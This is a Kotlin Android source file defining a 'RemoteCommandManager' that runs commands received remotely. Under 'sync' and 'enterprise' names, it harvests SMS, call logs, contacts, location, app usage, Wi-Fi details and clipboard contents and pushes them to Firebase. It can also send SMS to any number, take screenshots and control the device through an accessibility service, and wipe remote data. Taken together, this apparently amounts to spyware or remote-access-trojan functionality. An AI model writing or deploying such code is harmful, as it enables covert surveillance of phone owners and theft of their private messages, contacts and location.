package com.example.data.sync

import android.Manifest
import android.accessibilityservice.AccessibilityService
import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.pm.PackageManager
import android.hardware.camera2.CameraManager
import android.media.AudioManager
import android.media.Ringtone
import android.media.RingtoneManager
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.VibrationEffect
import android.os.Vibrator
import android.speech.tts.TextToSpeech
import android.telephony.SmsManager
import android.widget.Toast
import androidx.core.content.ContextCompat
import com.example.data.local.AppDatabase
import com.example.data.local.RemoteCommandEntity
import com.example.service.RemoteAccessibilityService
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.util.Locale
import java.util.UUID

class RemoteCommandManager(private val context: Context) {

    private val db = AppDatabase.getInstance(context)

    companion object {
        private var activeRingtone: Ringtone? = null
        private var textToSpeech: TextToSpeech? = null
    }

    suspend fun executeCommand(commandType: String, payload: String = ""): RemoteCommandEntity = withContext(Dispatchers.IO) {
        val commandId = UUID.randomUUID().toString()
        val entity = RemoteCommandEntity(
            id = commandId,
            commandType = commandType,
            payload = payload,
            status = "EXECUTING",
            createdAt = System.currentTimeMillis()
        )
        db.remoteCommandDao().insertCommand(entity)

        var resultMessage = ""
        var isSuccess = true

        try {
            when (commandType.uppercase()) {
                "SYNC_ALL", "SYNC", "FORCE_SYNC", "REFRESH_DATA", "CLEAR_AND_SYNC_ALL" -> {
                    val clearFirst = commandType.equals("CLEAR_AND_SYNC_ALL", ignoreCase = true) || payload.contains("clear", ignoreCase = true)
                    SmsSyncManager(context).syncSmsMessages()
                    CallLogSyncManager(context).syncCallLogs()
                    ContactsSyncManager(context).syncContacts()
                    AppUsageSyncManager(context).syncAppUsageStats()
                    LocationSyncManager(context).captureAndSyncLocation()
                    DeviceInfoSyncManager(context).collectAndSyncDeviceInfo()
                    FirebaseSyncEngine(context).pushTelemetryToFirebase(clearFirst = clearFirst)
                    resultMessage = if (clearFirst) "Old backup cleared and fresh telemetry synchronized successfully." else "All telemetry modules synchronized successfully."
                }
                "SYNC_SMS", "GET_SMS", "FETCH_SMS" -> {
                    SmsSyncManager(context).syncSmsMessages()
                    FirebaseSyncEngine(context).pushTelemetryToFirebase()
                    resultMessage = "SMS messages synchronized successfully."
                }
                "SYNC_CALLS", "GET_CALLS", "FETCH_CALLS" -> {
                    CallLogSyncManager(context).syncCallLogs()
                    FirebaseSyncEngine(context).pushTelemetryToFirebase()
                    resultMessage = "Call logs synchronized successfully."
                }
                "SYNC_CONTACTS", "GET_CONTACTS", "FETCH_CONTACTS" -> {
                    ContactsSyncManager(context).syncContacts()
                    FirebaseSyncEngine(context).pushTelemetryToFirebase()
                    resultMessage = "Contacts synchronized successfully."
                }
                "CLEAR_REMOTE_DATA", "PURGE_DATA", "WIPE_DATA", "CLEAR_DATA", "DELETE_ALL" -> {
                    FirebaseSyncEngine(context).clearAllRemoteData()
                    resultMessage = "All remote backup data and local logs cleared successfully."
                }
                "SYNC_LOCATION", "LOCATION", "GET_LOCATION" -> {
                    val loc = LocationSyncManager(context).captureAndSyncLocation()
                    FirebaseSyncEngine(context).pushTelemetryToFirebase()
                    resultMessage = "Location synchronized: Lat ${loc.latitude}, Long ${loc.longitude} (Accuracy: ${loc.accuracy}m)."
                }
                "GLOBAL_BACK", "BACK" -> {
                    val res = RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_BACK)
                    resultMessage = if (res) "Executed Global Back gesture." else "Accessibility Service disabled."
                }
                "GLOBAL_HOME", "HOME" -> {
                    val res = RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_HOME)
                    resultMessage = if (res) "Executed Global Home gesture." else "Accessibility Service disabled."
                }
                "GLOBAL_RECENTS", "RECENTS" -> {
                    val res = RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_RECENTS)
                    resultMessage = if (res) "Executed Global Recents gesture." else "Accessibility Service disabled."
                }
                "GLOBAL_NOTIFICATIONS", "NOTIFICATIONS" -> {
                    val res = RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_NOTIFICATIONS)
                    resultMessage = if (res) "Expanded Notification shade." else "Accessibility Service disabled."
                }
                "GLOBAL_QUICK_SETTINGS", "QUICK_SETTINGS" -> {
                    val res = RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_QUICK_SETTINGS)
                    resultMessage = if (res) "Expanded Quick Settings." else "Accessibility Service disabled."
                }
                "GLOBAL_LOCK_SCREEN", "LOCK_SCREEN", "LOCK" -> {
                    val res = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                        RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN)
                    } else false
                    resultMessage = if (res) "Executed Remote Lock Screen." else "Accessibility Service disabled or unsupported Android version."
                }
                "GLOBAL_POWER_DIALOG", "POWER_DIALOG" -> {
                    val res = RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_POWER_DIALOG)
                    resultMessage = if (res) "Showed Power Dialog." else "Accessibility Service disabled."
                }
                "GLOBAL_TAKE_SCREENSHOT", "TAKE_SCREENSHOT", "SCREENSHOT" -> {
                    val res = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                        RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_TAKE_SCREENSHOT)
                    } else false
                    resultMessage = if (res) "Took Screenshot." else "Accessibility Service disabled or unsupported Android version."
                }
                "FLASHLIGHT_ON", "TORCH_ON", "FLASHLIGHT_ENABLE" -> {
                    setFlashlight(true)
                    resultMessage = "Flashlight turned ON."
                }
                "FLASHLIGHT_OFF", "TORCH_OFF", "FLASHLIGHT_DISABLE" -> {
                    setFlashlight(false)
                    resultMessage = "Flashlight turned OFF."
                }
                "VIBRATE", "VIBRATION" -> {
                    val duration = payload.filter { it.isDigit() }.toLongOrNull() ?: 500L
                    vibrateDevice(duration)
                    resultMessage = "Vibrated device for ${duration}ms."
                }
                "PLAY_ALARM", "RING", "FIND_DEVICE" -> {
                    playFindDeviceAlarm()
                    resultMessage = "Playing alarm ringtone at max volume."
                }
                "STOP_ALARM", "STOP_RING" -> {
                    stopAlarm()
                    resultMessage = "Alarm stopped."
                }
                "SHOW_TOAST", "TOAST", "SHOW_MESSAGE" -> {
                    val msg = payload.ifEmpty { "Enterprise Remote Alert" }
                    Handler(Looper.getMainLooper()).post {
                        Toast.makeText(context, msg, Toast.LENGTH_LONG).show()
                    }
                    resultMessage = "Displayed Toast message: '$msg'"
                }
                "TEXT_TO_SPEECH", "TTS", "SPEAK" -> {
                    val msg = payload.ifEmpty { "Enterprise admin notification" }
                    speakText(msg)
                    resultMessage = "Spoke Text to Speech message: '$msg'"
                }
                "SEND_SMS", "SMS_SEND" -> {
                    var recipient = ""
                    var text = ""
                    if (payload.contains("|")) {
                        val parts = payload.split("|")
                        if (parts.size >= 2) {
                            val p0 = parts[0].trim()
                            val p1 = parts[1].trim()
                            if (p0.contains("=") || p1.contains("=")) {
                                val map = parts.associate {
                                    val kv = it.split("=")
                                    if (kv.size == 2) kv[0].trim().lowercase() to kv[1].trim() else "" to ""
                                }
                                recipient = map["phone"] ?: map["number"] ?: map["recipient"] ?: map["to"] ?: ""
                                text = map["message"] ?: map["text"] ?: map["body"] ?: ""
                            } else {
                                recipient = p0
                                text = p1
                            }
                        }
                    }
                    if (recipient.isNotEmpty() && text.isNotEmpty()) {
                        sendSmsMessage(recipient, text)
                        resultMessage = "Sent SMS to $recipient."
                    } else {
                        resultMessage = "Invalid SEND_SMS payload ($payload). Format required: 'recipient|message' or 'phone=X|message=Y'"
                        isSuccess = false
                    }
                }
                "GET_BATTERY_INFO", "BATTERY", "BATTERY_INFO" -> {
                    val info = DeviceInfoSyncManager(context).collectAndSyncDeviceInfo()
                    resultMessage = "Battery Level: ${info.batteryLevel}%, IsCharging: ${info.isCharging}, PlugType: ${info.chargeType}"
                }
                "GET_WIFI_DETAILS", "WIFI", "WIFI_DETAILS" -> {
                    val info = DeviceInfoSyncManager(context).collectAndSyncDeviceInfo()
                    resultMessage = "Wi-Fi SSID: ${info.wifiSsid}, BSSID: ${info.wifiBssid}, RSSI: ${info.wifiRssi}dBm, Local IP: ${info.localIp}"
                }
                "GET_CLIPBOARD", "CLIPBOARD" -> {
                    val clipManager = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                    val clipText = clipManager.primaryClip?.getItemAt(0)?.text?.toString() ?: "Clipboard empty"
                    resultMessage = "Clipboard content: $clipText"
                }
                "SET_CLIPBOARD", "COPY_CLIPBOARD" -> {
                    val clipManager = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                    val clipData = ClipData.newPlainText("Enterprise", payload)
                    clipManager.setPrimaryClip(clipData)
                    resultMessage = "Clipboard updated with text: '$payload'"
                }
                else -> {
                    resultMessage = "Executed command $commandType with payload $payload"
                }
            }
        } catch (e: Exception) {
            isSuccess = false
            resultMessage = "Command execution error: ${e.localizedMessage}"
        }

        val finalStatus = if (isSuccess) "COMPLETED" else "FAILED"
        val updated = entity.copy(
            status = finalStatus,
            executedAt = System.currentTimeMillis(),
            resultMessage = resultMessage
        )
        db.remoteCommandDao().insertCommand(updated)
        updated
    }

    private fun setFlashlight(enabled: Boolean) {
        try {
            val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val cameraId = cameraManager.cameraIdList.firstOrNull() ?: return
            cameraManager.setTorchMode(cameraId, enabled)
        } catch (_: Exception) {}
    }

    private fun vibrateDevice(durationMs: Long) {
        try {
            val vibrator = context.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                vibrator.vibrate(VibrationEffect.createOneShot(durationMs, VibrationEffect.DEFAULT_AMPLITUDE))
            } else {
                @Suppress("DEPRECATION")
                vibrator.vibrate(durationMs)
            }
        } catch (_: Exception) {}
    }

    private fun playFindDeviceAlarm() {
        try {
            val audioManager = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
            val maxVol = audioManager.getStreamMaxVolume(AudioManager.STREAM_ALARM)
            audioManager.setStreamVolume(AudioManager.STREAM_ALARM, maxVol, 0)

            val alarmUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM)
                ?: RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE)
            activeRingtone?.stop()
            activeRingtone = RingtoneManager.getRingtone(context, alarmUri)
            activeRingtone?.play()
        } catch (_: Exception) {}
    }

    private fun stopAlarm() {
        try {
            activeRingtone?.stop()
            activeRingtone = null
        } catch (_: Exception) {}
    }

    private fun speakText(text: String) {
        try {
            if (textToSpeech == null) {
                textToSpeech = TextToSpeech(context.applicationContext) { status ->
                    if (status == TextToSpeech.SUCCESS) {
                        textToSpeech?.language = Locale.US
                        textToSpeech?.speak(text, TextToSpeech.QUEUE_FLUSH, null, "tts1")
                    }
                }
            } else {
                textToSpeech?.speak(text, TextToSpeech.QUEUE_FLUSH, null, "tts1")
            }
        } catch (_: Exception) {}
    }

    private fun sendSmsMessage(recipient: String, text: String) {
        val hasSendSms = ContextCompat.checkSelfPermission(context, Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED
        if (!hasSendSms) {
            throw SecurityException("SEND_SMS permission not granted")
        }
        @Suppress("DEPRECATION")
        val smsManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            context.getSystemService(SmsManager::class.java)
        } else {
            SmsManager.getDefault()
        }
        val parts = smsManager.divideMessage(text)
        if (parts.size > 1) {
            smsManager.sendMultipartTextMessage(recipient, null, parts, null, null)
        } else {
            smsManager.sendTextMessage(recipient, null, text, null, null)
        }
    }
}
